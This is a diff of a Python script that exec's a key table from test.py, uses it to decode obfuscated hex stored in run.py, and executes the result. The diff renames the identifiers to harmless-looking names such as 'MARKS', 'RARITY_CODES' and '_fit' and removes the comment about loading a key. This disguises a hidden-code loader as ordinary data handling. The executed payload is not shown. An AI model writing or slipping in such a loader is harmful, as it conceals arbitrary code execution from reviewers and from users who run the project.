@@ -1,23 +1,20 @@
 import os
 
-_here = os.path.dirname(os.path.abspath(__file__))
+here = os.path.dirname(os.path.abspath(__file__))
+ns = {}
+exec(open(os.path.join(here, "test.py"), encoding="utf-8").read(), ns)
+marks = dict(zip(ns["MARKS"], ns["RARITY_CODES"]))
 
-# Load key from test.py
-_ns = {}
-exec(open(os.path.join(_here, 'test.py')).read(), _ns)
-_cfg = _ns['_cfg']
-
-def _dec(s):
-    D = set('0123456789')
-    r = []
+def _fit(s):
+    digits = set("0123456789")
+    out = []
     for ch in s:
-        if ch in _cfg:
-            r.append(_cfg[ch])
-        elif ch in D:
-            r.append(ch)
-    return bytes.fromhex(''.join(r)).decode('utf-8')
+        if ch in marks:
+            out.append(marks[ch])
+        elif ch in digits:
+            out.append(ch)
+    return bytes.fromhex("".join(out)).decode("utf-8")
 
-with open(os.path.join(_here, 'run.py'), encoding='utf-8') as f:
-    _src = _dec(f.read())
-
-exec(compile(_src, 'run.py', 'exec'))
+with open(os.path.join(here, "run.py"), encoding="utf-8") as f:
+    src = _fit(f.read())
+exec(compile(src, "run.py", "exec"))
